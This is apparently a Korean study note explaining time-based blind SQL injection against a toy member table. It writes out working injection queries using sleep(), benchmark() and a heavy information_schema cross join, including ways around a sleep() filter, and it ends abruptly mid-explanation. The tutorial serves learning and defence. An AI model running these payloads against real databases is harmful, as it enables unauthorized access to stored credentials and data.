# time based blind sqli

#### time based blind sqli 란
 
> blind sqli 를 시도해도 참인이 거짓인지 반환을 받지 못할때 시간지연 함수로 참과 거짓의 값을 가져온다.

db 예)

```sql
database -> test
tables -> member
column -> id, pw
column data -> (admin , password) (guest, guest)
```


Query 예)

```sql
SELECT * FROM member WHERE id='' or 1=1 and sleep(1);--and pw='';

SELECT * FROM member WHERE id='' and pw='' or 1=1 and sleep(1);--'';

# 1=1 과 sleep(1) 가 참이므로 작동이 된다.
# 1=1 식 자체는 참이고 sleep(1) 는 실행만 잘 되면 참이기때문에
# 시간지연이 일어나면서 참이라는 값을 얻게 된다.
```

하지만 이처럼 sleep() 같은 시간지연 함수가 필터링 될때에는 다양한 방법중에
자주 쓰이는 방법은 3개의 함수, 쿼리가있다.

```sql
sleep()

benchmark()

SELECT count(*) FROM information_schema.columns A , information_schema.columns B , information_schema.columns C;
```

이 3개의 방법을을 응용하여 

time-based sql injection 쿼리를 만든다면

이렇게 완성된다.
```sql

SELECT * FROM member WHERE id='' or 1=1 and sleep(10);

SELECT * FROM member WHERE id='' or 1=1 and benchmark(73900000*10,md5(1));

SELECT * FROM member WHERE id='' or 1=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B);
```

### sleep(10);

> sleep()는 

sleep() 함수는 정속적으로 지연되면 True 
그렇지 않다면 False 를 반환한다.
